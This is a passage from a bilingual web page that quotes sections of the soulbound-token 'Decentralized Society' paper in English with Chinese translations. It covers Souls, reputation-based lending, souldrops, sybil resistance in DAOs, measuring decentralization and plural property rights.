<li><p>thwarting and compensating for coordinated strategic behavior</p>
</li>
<li><p>measuring decentralization</p>
</li>
<li><p>creating novel markets with decomposable, shared rights and permissions</p>
</li>
</ul>
<p>This description culminates with a vision of DeSoc—a co-determined sociality, where Souls and communities come together bottom-up, as emergent properties of each other to co-create plural network goods, including plural intelligences, at a range of social scales.</p>
<p>Finally, we answer several potential concerns and objections, and make comparisons to other identity paradigms familiar in the web3 space, conceding often how our vision is just a first step but nonetheless an advance in programmable privacy and communication. Then, we consider technical pathways to bootstrap the vision we imagine. Building off these, we look forward, more philosophically, to the potential of DeSoc to redirect web3 to a more profound, legitimate, and transformative path.</p>
</blockquote>
<p>我们首先解释 DeSoc 的原语，以持有代表承诺、凭证和隶属关系的不可转让（最初是公开的）“灵魂绑定”代币 (SBT) 为中心的账户（或钱包）。这样的代币就像一份扩展的简历，由证明这些社会关系的其他钱包发行。</p>
<p>然后，我们描述了跨社交堆栈的越来越雄心勃勃的应用程序的“阶梯”，这些原语可以赋予权力，包括：</p>
<ul>
<li><p>确定出处</p>
</li>
<li><p>通过声誉打开抵押不足的贷款市场</p>
</li>
<li><p>实现分散的密钥管理</p>
</li>
<li><p>阻挠和补偿协调的战略行为</p>
</li>
<li><p>衡量权力下放</p>
</li>
<li><p>创建具有可分解、共享权利和许可的新市场</p>
</li>
</ul>
<p>这种描述以 DeSoc 的愿景达到高潮——一种共同决定的社会性，灵魂和社区自下而上地聚集在一起，作为彼此的新兴属性，在一系列社会尺度上共同创造包括多元智能在内的多元网络商品。<br>最后，我们回答了几个潜在的担忧和反对意见，并与 web3 空间中熟悉的其他身份范式进行了比较，经常承认我们的愿景只是第一步，但却是可编程隐私和通信方面的进步。然后，我们考虑引导我们想象的愿景的技术途径。在这些基础上，我们从更哲学的角度期待 DeSoc 将 web3 重定向到更深刻、更合法和更具变革性的道路的潜力。</p>
<blockquote>
<h3 id="§3-SOULS"><a href="#§3-SOULS" class="headerlink" title="§3 SOULS"></a>§3 SOULS</h3><p>Our key primitive is accounts, or wallets, that hold publicly visible, non-transferable (but possibly revocable-by-the-issuer) tokens. We refer to the accounts as “Souls” and tokens held by the accounts as “Soulbound Tokens” (SBTs). We initially assume publicity despite our deep interest in privacy because it is technically simpler to validate as a proof-of-concept, even if limited by the subset of tokens people are willing to publicly share. Later in the paper, we introduce the concept of “programmable privacy” for richer use cases.</p>
<p>Imagine a world where most participants have Souls that store SBTs corresponding to a series of affiliations, memberships, and credentials. For example, a person might have a Soul that stores SBTs representing educational credentials, employment history, or hashes of their writings or works of art. In their simplest form, these SBTs can be “self-certified,” similar to how we share information about ourselves in our CVs. But the true power of this mechanism emerges when SBTs held by one Soul can be issued—or attested—by other Souls, who are counterparties to these relationships. These counterparty Souls could be individuals, companies, or institutions. For example, the Ethereum Foundation could be a Soul that issues SBTs to Souls who attended a developer conference. A university could be a Soul that issues SBTs to graduates. A stadium could be a Soul that issues SBTs to longtime Dodgers fans.</p>
<p>Note there is no requirement for a Soul to be linked to a legal name, or for there to be any protocol-level attempt to ensure “one Soul per human.” A Soul could be a persistent pseudonym with a range of SBTs that cannot easily be linked. We also do not assume non-transferability of Souls across humans. Instead, we try to illustrate how these properties, where needed, can naturally emerge from the design itself.</p>
</blockquote>
<p><strong>我们的关键原语是持有公开可见、不可转让（但可能由发行人撤销）代币的账户或钱包。我们将账户称为“灵魂”，将账户持有的代币称为“灵魂绑定代币”（SBT）。</strong>尽管我们对隐私有着浓厚的兴趣，但我们最初假设是公开的，因为它在技术上更容易验证为概念验证，即使受到人们愿意公开分享的代币子集的限制。在本文的后面，我们为更丰富的用例引入了“可编程隐私”的概念。<br>想象一个世界，其中大多数参与者都拥有存储与一系列从属关系、会员资格和证书相对应的 SBT 的灵魂。例如，一个人可能有一个灵魂，它存储代表教育证书、工作经历或他们的著作或艺术作品的哈希值的 SBT。在最简单的形式中，这些 SBT 可以“自我认证”，类似于我们在简历中分享关于自己的信息的方式。但是，当一个灵魂持有的 SBT 可以由作为这些关系的对手的其他灵魂发行或证明时，这种机制的真正力量就会显现出来。这些对手灵魂可能是个人、公司或机构。例如，以太坊基金会可以是一个灵魂，它向参加开发者大会的灵魂发放 SBT。大学可以是向毕业生发放 SBT 的灵魂。体育场可能是向道奇队的长期球迷发放 SBT 的灵魂。<br>请注意，灵魂不需要与合法名称相关联，也不需要任何协议级别的尝试来确保“每个人一个灵魂”。灵魂可能是一个持久的化名，具有一系列无法轻易链接的 SBT。我们也不假设灵魂在人类之间的不可转移性。相反，我们试图说明这些属性如何在需要时自然地从设计本身中出现。</p>
<blockquote>
<h3 id="§4-STAIRWAY-TO-DESOC"><a href="#§4-STAIRWAY-TO-DESOC" class="headerlink" title="§4 STAIRWAY TO DESOC"></a>§4 STAIRWAY TO DESOC</h3><h4 id="4-1-Art-amp-Soul"><a href="#4-1-Art-amp-Soul" class="headerlink" title="4.1 Art &amp; Soul"></a>4.1 Art &amp; Soul</h4><h4 id="4-2-Soul-Lending"><a href="#4-2-Soul-Lending" class="headerlink" title="4.2 Soul Lending"></a>4.2 Soul Lending</h4><p>Perhaps the largest financial value built directly on reputation is credit and uncollateralized lending. Currently, the web3 ecosystem cannot replicate simple forms of uncollateralized lending, because all assets are transferable and saleable—thus simply forms of collateral. The “traditional” financial ecosystem supports many forms of uncollateralized lending, but relies on centralized credit scores to gauge creditworthiness of borrowers who have little incentive to share information about their credit history. But such scores have many flaws. At best, they opaquely overweight and underweight factors relevant to creditworthiness, and bias those who haven’t accumulated su￾cient data—mainly minorities and the poor. At worst, they can enable Black Mirror opaque “social credit” systems that engineer social outcomes and reinforce discriminations.</p>
<p><strong>An ecosystem of SBTs could unlock a censorship-resistant, bottom-up alternative to top-down commercial and “social” credit systems.</strong> SBTs that represent education credentials, work history, and rental contracts could serve as a persistent record of credit-relevant history, allowing Souls to stake meaningful reputation to avoid collateral requirements and secure a loan. Loans and credit lines could be represented as non-transferable but revocable SBTs, so they are nested amongst a Soul’s other SBTs—a kind of non-sizable reputational collateral—until they are repaid and subsequently burned, or better yet, replaced with proof of repayment. SBTs offer useful security properties: non-transferability prevents transferring or hiding outstanding loans, while a rich ecosystem of SBTs ensures that borrowers who try to escape their loans (perhaps by spinning up a fresh Soul) will lack SBTs to meaningfully stake their reputation. </p>
<p>The ease of computing public liabilities with SBTs would open-source lending markets. New correlations between SBTs and repayment risk would emerge, birthing better lending algorithms that predict creditworthiness and thereby reduce the role of centralized, opaque credit-scoring infrastructure. Better yet, lending would likely occur within social connections. In particular, SBTs would offer a substrate for community lending practices similar to those pioneered by Muhammad Yunus and the Grameen Bank, where members of a social network agree to support one another’s liabilities. Because a Soul’s constellation of SBTs represents memberships across social groups, participants could easily discover other Souls who would be valuable co-participants in a group lending project. Whereas commercial lending is a “lend-it-and-forget-it” until repayment model, community lending might take a “lend-it-and-help-it” approach—combining working capital with human capital with greater rates of return.</p>
<p>How does uncollateralized community lending get o￾ the ground? At the start, we expect Souls to carry only SBTs that reflect information they are comfortable with sharing publicly, such as information in a CV. While limited in scope, it might be a level of resolution sufficient for intra-community lending<br>experiments to take off, especially if the SBTs are issued by reputable institutions. For example, a constellation of SBTs that show certain programming credentials, participation in several conferences, and work history might be sufficient for a Soul to take a loan (or raise seed capital) for their venture. Such credentials and social relationships already informally play an important, but opaque role in capital allocation like venture capital.</p>
</blockquote>
<p>直接建立在声誉之上的最大财务价值也许是信贷和无抵押贷款。目前，web3 生态系统无法复制简单形式的无抵押借贷，因为所有资产都是可转让和可销售的——因此只是抵押形式。“传统”金融生态系统支持多种形式的无抵押贷款，但依赖于集中的信用评分来衡量借款人的信用度，这些借款人几乎没有动力分享有关其信用历史的信息。但这样的分数有很多缺陷。充其量，他们不透明地高估和低估与信用相关的因素，并偏向那些没有积累足够数据的人——主要是少数族裔和穷人。在最坏的情况下，他们可以启用黑镜不透明的“社会信用”系统，从而设计社会成果并加强歧视。</p>
<p><strong>SBT 的生态系统可以解锁自上而下的商业和“社会”信用系统的抗审查、自下而上的替代方案。</strong>代表教育证书、工作经历和租赁合同的 SBT 可以作为持续记录与信用相关的历史记录，允许灵魂获得有意义的声誉，以避免抵押要求并获得贷款。贷款和信贷额度可以表示为不可转让但可撤销的 SBT，因此它们嵌套在灵魂的其他 SBT 中——一种规模不大的声誉抵押品——直到它们被偿还并随后被烧毁，或者更好的是，被证明取代还款。SBT 提供了有用的安全属性：不可转让性可防止转移或隐藏未偿还的贷款，而丰富的 SBT 生态系统可确保试图逃避贷款（可能通过旋转新的灵魂）的借款人将缺乏 SBT 来有意义地抵押他们的声誉。</p>
<p>使用 SBT 计算公共负债的便利性将开源贷款市场。SBT 与还款风险之间将出现新的相关性，从而产生更好的贷款算法来预测信用，从而减少集中、不透明的信用评分基础设施的作用。更好的是，借贷很可能发生在社会关系中。特别是，SBT 将为类似于穆罕默德尤努斯和格莱珉银行开创的社区借贷实践提供基础，其中社交网络的成员同意支持彼此的债务。因为一个灵魂的 SBT 星座代表了跨社会群体的成员资格，所以参与者可以很容易地发现其他灵魂，他们将是一个团体借贷项目的有价值的共同参与者。商业贷款是一种“先贷后忘”直至还款的模式，而社区贷款可能会采取“先贷后助”的方式——将营运资本与人力资本结合起来，从而获得更高的回报率。</p>
<p>无抵押社区贷款是如何落地的？一开始，我们希望 Souls 只携带反映他们愿意公开分享的信息的 SBT，例如简历中的信息。虽然范围有限，但它可能足以让社区内借贷实验起飞，特别是如果 SBT 是由信誉良好的机构发行的。例如，显示某些编程证书、参加多个会议和工作经历的 SBT 星座可能足以让灵魂为他们的企业贷款（或筹集种子资金）。这种资历和社会关系已经非正式地在风险投资等资本配置中发挥了重要但不透明的作用。</p>
<blockquote>
<h4 id="4-4-Souldrops"><a href="#4-4-Souldrops" class="headerlink" title="4.4 Souldrops"></a>4.4 Souldrops</h4><p>So far we have explained how Souls can come to represent individuals and re￾ect their unique traits and solidarities as they acquire SBTs that reflect their affiliations, memberships, and credentials. Such individuation helps Souls build reputations, establish provenance, access uncollateralized lending markets, and protect reputation and identity. But the converse is also true; SBTs also enable communities to be convened at unique intersections of Souls. Thus far web3 has largely relied on token sales or airdrops to summon new communities, which yield little accuracy or precision. Airdrops, in which tokens are algorithmically given for free to a set of wallets, mostly fall to some combination of existing token holders and wallets—easily attacked by sybils, encouraging strategic behavior and the Matthew effect. SBTs offer a radical improvement we call “souldrops.”</p>
<p>“Souldrops” are airdrops based on computations over SBTs and other tokens within a Soul. For example, a DAO that wants to convene a community within a particular layer 1 protocol could souldrop to developers who hold 3 out of the last 5 conference attendance SBTs, or other tokens reflecting attendance like POAPs. Protocols could also programmatically weight token drops across a combination of SBTs. We can imagine a non-profit whose mission is to plant trees dropping governance tokens to Souls who hold a mix of environmental action SBTs, gardening SBTs, and carbon sequestration tokens—perhaps dropping more tokens to the carbon sequestration token-holders.</p>
<p>Souldrops could also introduce novel incentives to encourage community engagement. Dropped SBTs could be engineered to be soulbound for a period but eventually “vest” into transferable tokens over time. Or the reverse could be true. Transferable tokens held for some period could unlock the right to SBTs that confer further governance rights over a protocol. SBTs open a rich possibility space to experiment with mechanisms that maximize community engagement and other goals, like decentralization, which we discuss further below.</p>
</blockquote>
<p>到目前为止，我们已经解释了灵魂如何能够代表个人并在他们获得反映他们的隶属关系、成员资格和证书的 SBT 时反映他们的独特特征和团结。这种个性化有助于 Souls 建立声誉、确定出处、进入无抵押贷款市场并保护声誉和身份。但反过来也是如此； SBT 还使社区能够在灵魂的独特交汇处召集。到目前为止，web3 主要依靠代币销售或空投来召唤新社区，这几乎没有准确性或精确度。空投，其中代币通过算法免费提供给一组钱包，主要属于现有代币持有者和钱包的某种组合——很容易被女巫攻击，鼓励战略行为和马太效应。 SBT 提供了一种彻底的改进，我们称之为“灵魂点”。</p>
<p>“Souldrops”是基于灵魂内 SBT 和其他代币计算的空投。例如，想要在特定的第 1 层协议中召集社区的 DAO 可以向持有最近 5 次会议出席 SBT 中的 3 次的开发人员或其他反映出席情况的代币（如 POAP）的开发人员投降。协议还可以在 SBT 组合中以编程方式加权令牌下降。我们可以想象一个非营利组织，其使命是植树，将治理代币投放给持有环境行动 SBT、园艺 SBT 和碳封存代币的灵魂——也许向碳封存代币持有者投放更多代币。</p>
<p>Souldrops 还可以引入新的激励措施来鼓励社区参与。丢弃的 SBT 可以设计为在一段时间内受到灵魂约束，但最终随着时间的推移“归属”为可转让的代币。或者反过来可能是正确的。持有一段时间的可转让代币可以解锁 SBT 的权利，从而赋予协议进一步的治理权。 SBT 为尝试最大化社区参与和其他目标（如权力下放）的机制提供了丰富的可能性空间，我们将在下面进一步讨论。</p>
<blockquote>
<h4 id="4-5-The-DAO-of-Souls"><a href="#4-5-The-DAO-of-Souls" class="headerlink" title="4.5 The DAO of Souls"></a>4.5 The DAO of Souls</h4><p>Distributed autonomous organizations (DAOs) are virtual communities that come together around a common purpose, coordinated by voting through smart contracts on a public blockchain. While DAOs offer great potential for coordination of global communities across distance and difference, they are vulnerable to sybil attacks where a single user can have multiple wallets to accrue voting power—or in less sophisticated one-token-one-vote style governance, simply hoard tokens to accrue 51% voting power and dispossess the other 49%.</p>
<p>DAOs could mitigate sybil attacks with SBTs in several ways, by:</p>
<ul>
<li>computing over a Soul’s constellation of SBTs to differentiate between unique Souls and probable bots, and denying any voting power to a Soul that appears to be a Sybil.</li>
<li>conferring more voting power to Souls who hold more reputable SBTs—like work or educational credentials, licenses, or certifications.</li>
<li>issuing specialized “proof-of-personhood” SBTs, which could help other DAOs bootstrap sybil resistance.</li>
<li>checking for correlations between SBTs held by Souls who support a particular vote, and applying a lower vote weight to voters who are highly correlated.</li>
</ul>
<p>The latter idea of correlation checking is particularly promising and novel. A vote supported by many Souls who all share the same SBT(s) is more likely to be a Sybil attack and—even if not a Sybil attack—such a vote is more likely to be a group of Souls who are making the same error in judgment or who share the same bias, and so should reasonably be weighted less than a vote with the same numerical level of support but from a more diverse base of participants.</p>
<p>We explore the latter idea mathematically in greater detail in the context of quadratic funding in the Appendix, where we introduce a new primitive, called the “correlation score.” This concept of correlation discounting could be extended to structure deliberative conversations. For example, DAOs susceptible to majoritarian capture could compute over SBTs to bring maximally diverse members together in conversation and ensure minority voices are heard.</p>
<p>DAOs could also rely on SBTs to deter forms of strategic behavior such as “vampire attacks.” In such attacks, a DAO—typically with an associated DeFi protocol of economic value—free-rides off the R&amp;D of another by copying their open-source code and subsequently luring users’ liquidity with a token. DAOs could deter free-riders by first creating a norm around souldropping (perhaps vesting SBTs) only to probable sybil-resistant Souls who delivered liquidity and then withholding souldrops to Souls who shifted their liquidity in a vampire attack. The same mechanism wouldn’t work with airdrops to wallets because a holder can spread liquidity across many wallets to obfuscate their liquidity trail.</p>
<p>DAOs could also use SBTs to make leadership and governance programmatically responsive to their communities. Leadership roles could dynamically shift as the composition of the community shifts—as reflected in the changing distribution of SBTs across member Souls. A subset of members could be elevated to potential officer roles based on their intersectionality and coverage across multiple communities within the DAO. Protocols that value community cohesion could use SBTs to keep intersectional Souls at the center. Alternatively, DAOs may opt for governance that elevates certain combinations of traits more than others, such as diversity among zip codes or participation among a subset of special hobby DAOs.</p>
</blockquote>
<p>分布式自治组织 (DAO) 是围绕一个共同目的聚集在一起的虚拟社区，通过公共区块链上的智能合约投票进行协调。虽然 DAO 为跨距离和差异的全球社区协调提供了巨大的潜力，但它们很容易受到女巫攻击，其中单个用户可以拥有多个钱包来积累投票权——或者在不太复杂的单代币一票式治理中，简单地囤积代币累积 51% 的投票权并剥夺其他 49% 的投票权。</p>
<p>DAO 可以通过以下几种方式减轻 SBT 的女巫攻击：</p>
<ul>
<li>计算灵魂的 SBT 星座以区分独特的灵魂和可能的机器人，并拒绝对看似女巫的灵魂有任何投票权。</li>
<li>将更多的投票权授予持有更有信誉的 SBT（如工作或教育证书、执照或证书）的灵魂。</li>
<li>发布专门的“人格证明”SBT，这可以帮助其他 DAO 引导女巫抵抗。</li>
<li>检查支持特定投票的灵魂持有的 SBT 之间的相关性，并对高度相关的选民应用较低的投票权重。</li>
</ul>
<p>后一种相关性检查的想法特别有前途和新颖。由共享相同 SBT 的许多灵魂支持的投票更有可能是女巫攻击，即使不是女巫攻击，这样的投票也更有可能是一群犯同样错误的灵魂在判断或谁有相同的偏见，因此应该合理地加权低于具有相同数量支持但来自更多样化的参与者基础的投票。</p>
<p>我们在附录中的二次融资的背景下更详细地探讨了后一种想法，我们在其中引入了一个新的原语，称为“相关分数”。这种相关折扣的概念可以扩展到构建审议对话。例如，容易被多数派俘虏的 DAO 可以通过 SBT 进行计算，以将最大程度不同的成员聚集在一起进行对话，并确保听到少数派的声音。</p>
<p>DAO 还可以依靠 SBT 来阻止各种形式的战略行为，例如“吸血鬼攻击”。在此类攻击中，DAO（通常具有相关的具有经济价值的 DeFi 协议）通过复制其开源代码并随后用代币吸引用户的流动性来搭便车。 DAO 可以阻止搭便车者，首先围绕灵魂投掷（可能授予 SBT）创建一个规范，仅针对提供流动性的可能的抗女巫灵魂，然后将灵魂投递给在吸血鬼攻击中转移流动性的灵魂。同样的机制不适用于空投到钱包，因为持有人可以将流动性分散到许多钱包中以混淆他们的流动性轨迹。</p>
<p>DAO 还可以使用 SBT 以编程方式响应其社区的领导和治理。领导角色可以随着社区组成的变化而动态变化——这反映在 SBT 在成员灵魂中的分布变化中。根据 DAO 内多个社区的交叉性和覆盖范围，可以将一部分成员提升为潜在的官员角色。重视社区凝聚力的协议可以使用 SBT 将交叉灵魂保持在中心。或者，DAO 可能会选择比其他更提升某些特征组合的治理，例如邮政编码之间的多样性或特殊爱好 DAO 子集的参与。</p>
<blockquote>
<h4 id="4-6-Measuring-Decentralization-through-Pluralism"><a href="#4-6-Measuring-Decentralization-through-Pluralism" class="headerlink" title="4.6 Measuring Decentralization through Pluralism"></a>4.6 Measuring Decentralization through Pluralism</h4><h4 id="Measuring-Decentralization-through-Pluralism"><a href="#Measuring-Decentralization-through-Pluralism" class="headerlink" title="Measuring Decentralization through Pluralism"></a>Measuring Decentralization through Pluralism</h4><p>When analyzing real-world ecosystems, it is desirable to measure how decentralized the ecosystem actually is. To what extent is the ecosystem truly decentralized, and to what extent is the decentralization “fake” and the ecosystem de-facto dominated by one or a small set of coordinating entities?</p>
<p>Two popular decentralization metrics are the Nakamoto coefficient proposed by Balaji Srinivasan, which measures how many distinct entities need to be combined to gather 51% of some resource, and the Herfindahl-Hirschman index used to measure market concentration for antitrust purposes, calculated by summing the squares of the market shares of the market participants. These approaches, however, leave open key questions of what are the correct resources to measure, how to deal with partial coordination, and the gray areas in what constitutes a “distinct entity.”</p>
<p>For example, nominally independent firms may have many major shareholders in common, have directors who are friends with each other, or be regulated by the same government. In the context of token protocols, measuring decentralization of token holdings by looking at on-chain wallets is wildly inaccurate because many people have multiple wallets, and some wallets (e.g., exchanges) represent many people. Moreover, even if addresses could be traced back to unique individuals, those individuals could be socially correlated groups prone to accidental coordination (at best) or intentional collusion (at worst). A better way of measuring decentralization would capture social dependencies, weak affiliations, and strong solidarities.</p>
<p>SBTs support a different way of measuring the level of decentralization (or pluralism) in a DAO, protocol, or network.</p>
<ul>
<li><p>As a first step, protocol could limit token voting to reasonably sybil-resistant (or SBT rich) Souls.</p>
</li>
<li><p>As a second step, a protocol could examine the correlations between SBTs held by different Souls and discount votes by Souls (pooling them as only partially separate) if they share a large number of SBTs. (We explore the latter idea mathematically in greater detail in the context of quadratic funding in Appendix A, where we introduce a new primitive, called the “correlation score.”)</p>
</li>
<li><p>As a third step, to zoom out and get a sense of the decentralization across the network, one could measure the correlations between SBTs held by Souls among and across different layers of the network stack—measuring correlations in voting, token ownership, governance-related communication, and even control over computational resources. </p>
</li>
</ul>
<p>SBTs allow us to begin to measure the decentralization of an interoperating and layered ecosystem that is very di￾cult to measure at all today. There is still a large, open question of what formulas would best capture what we want to measure and be least vulnerable to manipulation. There are also many questions about how to examine the relationships of SBTs—weighting some SBTs more than others, discounting nested SBTs, or also factoring in the composition of transferable tokens within Souls. However, with a rich ecosystem of Souls and SBTs, a much larger amount of data would be available to make these calculations and move towards meaningful decentralization.</p>
</blockquote>
<h4 id="通过多元化衡量去中心化"><a href="#通过多元化衡量去中心化" class="headerlink" title="通过多元化衡量去中心化"></a>通过多元化衡量去中心化</h4><p>在分析现实世界的生态系统时，需要衡量生态系统的去中心化程度。生态系统在多大程度上真正去中心化，去中心化在多大程度上是“假的”，生态系统事实上由一个或一小部分协调实体主导？</p>
<p>两个流行的去中心化指标是 Balaji Srinivasan 提出的 Nakamoto 系数，它衡量需要合并多少不同的实体才能收集 51% 的资源，以及用于衡量反垄断目的的市场集中度的 Herfindahl-Hirschman 指数，通过将市场参与者的市场份额的平方。然而，这些方法留下的关键问题是什么是要衡量的正确资源、如何处理部分协调以及构成”不同实体”的灰色区域。</p>
<p>例如，名义上独立的公司可能有许多共同的大股东，有彼此是朋友的董事，或者受同一政府监管。在代币协议的背景下，通过查看链上钱包来衡量代币持有量的去中心化是非常不准确的，因为很多人有多个钱包，而一些钱包（例如交易所）代表了很多人。此外，即使地址可以追溯到独特的个人，这些个人也可能是容易发生意外协调（最好的情况）或故意勾结（最坏的情况）的社会相关群体。衡量权力下放的更好方法是捕捉社会依赖、弱联系和强大的团结。</p>
<p>SBT 支持一种不同的方式来衡量 DAO、协议或网络中的去中心化（或多元化）水平。</p>
<ul>
<li><p>作为第一步，协议可以将代币投票限制为合理抗女巫（或富含 SBT）的灵魂。</p>
</li>
<li><p>作为第二步，如果不同灵魂拥有大量 SBT，协议可以检查不同灵魂持有的 SBT 与灵魂的折扣投票之间的相关性（将它们作为仅部分分开的池）。（我们在附录 A 的二次融资背景下更详细地探讨了后一个想法，我们在其中引入了一个新的原语，称为“相关分数”。）</p>
</li>
<li><p>作为第三步，为了缩小并了解整个网络的去中心化，可以测量 Souls 持有的 SBT 在网络堆栈的不同层之间和跨层之间的相关性——测量投票、代币所有权、治理方面的相关性——相关的通信，甚至对计算资源的控制。</p>
</li>
</ul>
<p>SBT 使我们能够开始衡量当今很难衡量的互操作和分层生态系统的去中心化程度。关于哪些公式最能捕捉我们想要测量的内容并且最不容易受到操纵，仍然存在一个很大的悬而未决的问题。还有很多关于如何检查 SBT 的关系的问题——对某些 SBT 的权重比其他的更高，对嵌套的 SBT 进行折扣，或者还考虑到 Souls 中可转让代币的组成。然而，随着 Souls 和 SBT 的丰富生态系统，大量数据可用于进行这些计算并朝着有意义的去中心化方向发展。</p>
<blockquote>
<h4 id="4-7-Plural-Property"><a href="#4-7-Plural-Property" class="headerlink" title="4.7 Plural Property"></a>4.7 Plural Property</h4><p>DAOs often own—or organize around owning—assets, both in the virtual and physical worlds. So<br>far web3’s scope has largely been limited to a narrow class of property whose bundle of rights are wholly transferable: tokens, NFTs, artworks, first editions or rare manuscripts like the U.S. Constitution. But the emphasis on transferability has been to web3’s detriment, making it incapable of representing and supporting some of the simplest and ubiquitous property contracts today, such as apartment leases. Property rights are defined in the Roman legal tradition as bundles of rights to use (“usus”), consume or destroy (“abusus”), and profit (“fructus”). Rarely are all these rights jointly vested in the same owner. Apartment leases, for example, confer limited rights of use (“usus”) to the lessor, but not unfettered rights to destroy the apartment (“abusus”), sell it off (“fructus”), or even transfer use (subletting). Rights of real property (land) are typically encumbered by a range of restrictions on private use, grants of public rights of access, limits on rights of sale, and even rights of purchase by eminent domain. They are also typically encumbered with mortgages that transfer some financial value to lenders.</p>
<p>The future of property innovation is unlikely to build on wholly transferable private property so far<br>imagined web3. Rather <strong>innovation will hinge on the ability to decompose property rights to match features of existing property regimes, and code even richer elaborations.</strong> Corporations and other<br>organizational forms evolved precisely to reconfigure property rights in even more creative ways—for<br>example, granting employees access to proprietary facilities (“usus”), but reserving for managers rights to change or damage assets (“abusus”), while paying shareholders most financial benefit (“fructus”). SBTs have the flexibility to represent and proliferate such nuanced property rights of both physical and virtual assets, while encouraging new experiments. Here are just a few use cases:</p>
<ul>
<li>Permissioning access to privately or publicly controlled resources (e.g., homes, cars, museums, parks, and virtual equivalents). Transferable NFTs fail to capture this use case well because often access rights are conditional and non-transferable: if I trust you to enter my backyard and use it as recreational space, that does not imply that I trust you to sub-license that permission to someone else.</li>
<li>Data Cooperatives where SBTs grant data access to researchers, while instantiating members’ rights to grant access (perhaps by quadratic vote) and bargain for economic rights to discoveries and intellectual property born out of research. We explore this further in Section 4 on Plural Sensemaking.</li>
<li>Experiments with local currencies with rules that make them more valuable to hold and spend by Souls who live in a particular region or are part of a particular community.</li>
<li>Experiments in participation where SBTs create a continuous basis for less contextualized Souls (e.g., immigrants, adolescents) to gain influence within novel and broader networks. Such Souls would begin with narrow SBTs that pool them with their families or local communities. As their affiliations gradually diversify, they would gain broader SBTs that instantiate voting rights to influence  broader networks—in the spirit of Danielle Allen’s idea of polypolitanism—a process that currently is mediated by arbitrary age and residence cut-offs.</li>
<li>Experiments in market design, such as Harberger taxation and SALSA (self-assessed licenses sold at auction), where holders of an asset post a self-assessed price at which anyone else can buy the asset from them, and must periodically pay a tax proportional to the self-assessed price to maintain control. SBTs could be used to create more nuanced versions of SALSA—for example, where rights of participation are approved by the community to minimize strategic behavior from within or outside the community.</li>
<li>Experiments in democratic mechanism design such as quadratic voting. Holders of SBTs representing membership in a community could quadratically vote on parameters such as incentives and tax rates. Ultimately, “markets” and “politics” are not separate design spaces; SBTs can be a major part of a technological stack that enables the entire space between the two categories to be explored. Provision of public goods through quadratic funding is another such intersection.</li>
</ul>
<p>Of course, there are dystopian scenarios to consider. Immigration systems could be permissioned with migratory SBTs. Regulatory capture could be codified in nested community tokens, where homeowners have a disproportionate voting power and stall housing construction. SBTs could automate red-lining. As we discuss further below, these scenarios should be considered within the context of the current opaque-top-down permissions and discriminations. SBTs make discrimination more transparent and therefore potentially contestable.</p>
</blockquote>
<p>DAO 通常在虚拟世界和物理世界中拥有或围绕拥有资产进行组织。到目前为止，web3 的范围主要局限于一小类财产，其权利捆绑可以完全转让：代币、NFT、艺术品、第一版或像美国宪法这样的稀有手稿。但是，对可转让性的强调对 web3 不利，使其无法代表和支持当今一些最简单且无处不在的财产合同，例如公寓租赁。财产权在罗马法律传统中被定义为使用权（“usus”）、消费或破坏权（“abusus”）和利润（“fructus”）的组合。很少有所有这些权利共同归属于同一所有者。例如，公寓租赁授予出租人有限的使用权（“usus”），但不授予出租人摧毁公寓（“abusus”）、出售（“fructus”）甚至转让使用权（转租）的不受限制的权利.不动产（土地）的权利通常受到一系列私人使用限制、公共使用权授予、销售权限制，甚至征用权购买权的限制。他们通常还背负着将一些财务价值转移给贷方的抵押贷款。</p>
<p>财产创新的未来不太可能建立在迄今为止想象的 web3 完全可转让的私有财产之上。<strong>相反，创新将取决于分解财产权以匹配现有财产制度特征的能力，并编写更丰富的细节。</strong>公司和其他组织形式的演变恰恰是为了以更具创造性的方式重新配置产权——例如，授予员工使用专有设施（“usus”）的权限，但保留经理更改或损坏资产的权利（“abusus”），同时支付股东最大的经济利益（“结果”）。 SBT 可以灵活地代表和扩大物理和虚拟资产的细微产权，同时鼓励新的实验。这里只是一些用例：</p>
<ul>
<li>允许访问私人或公共控制的资源（例如，住宅、汽车、博物馆、公园和虚拟等价物）。可转让的 NFT 未能很好地捕捉到这个用例，因为访问权限通常是有条件的且不可转让的：如果我相信你会进入我的后院并将其用作娱乐空间，这并不意味着我相信你会将该许可转授给其他人。</li>
<li>SBT 授予研究人员数据访问权限的数据合作社，同时赋予成员授予访问权限的权利（可能通过二次投票），并就研究产生的发现和知识产权的经济权利进行谈判。我们将在第 4 节“复数意义构建”中进一步探讨这一点。</li>
<li>试验当地货币的规则，让居住在特定地区或属于特定社区的灵魂更有价值地持有和消费。</li>
<li>参与实验，其中 SBT 为较少情境化的灵魂（例如移民、青少年）在新颖和更广泛的网络中获得影响力创造持续的基础。这样的灵魂将从狭窄的 SBT 开始，将他们与家人或当地社区集中在一起。随着他们的从属关系逐渐多样化，他们将获得更广泛的 SBT，以实例化投票权以影响更广泛的网络——本着 Danielle Allen 的多元政治理念的精神——这一过程目前由任意年龄和居住地截止进行调解。</li>
<li>市场设计实验，例如 Harberger 税收和 SALSA（在拍卖中出售的自我评估许可证），资产持有人发布自我评估价格，任何其他人都可以从他们那里购买资产，并且必须定期缴纳税款与自我评估的价格成正比，以保持控制。 SBT 可用于创建更细微的 SALSA 版本——例如，社区批准参与权，以尽量减少来自社区内部或外部的战略行为。</li>
<li>二次投票等民主机制设计实验。代表社区成员的 SBT 持有者可以对激励和税率等参数进行二次投票。归根结底，“市场”和“政治”不是独立的设计空间。 SBT 可以成为技术堆栈的主要部分，可以探索两个类别之间的整个空间。通过二次融资提供公共产品是另一个这样的交叉点。</li>
</ul>
<p>当然，还有一些反乌托邦场景需要考虑。移民系统可以通过迁移 SBT 获得许可。 监管捕获可以编码在嵌套的社区代币中，其中房主拥有不成比例的投票权并阻碍住房建设。SBT 可以使红线自动化。 正如我们在下面进一步讨论的那样，应该在当前不透明的自上而下的权限和歧视的背景下考虑这些场景。 SBT 使歧视更加透明，因此可能具有争议性。</p>
<blockquote>
<h4 id="4-8-From-Private-and-Public-Goods-to-Plural-Network-Goods"><a href="#4-8-From-Private-and-Public-Goods-to-Plural-Network-Goods" class="headerlink" title="4.8 From Private and Public Goods to Plural Network Goods"></a>4.8 From Private and Public Goods to Plural Network Goods</h4></blockquote>
<p>从私人和公共产品到多元网络产品</p>
<blockquote>
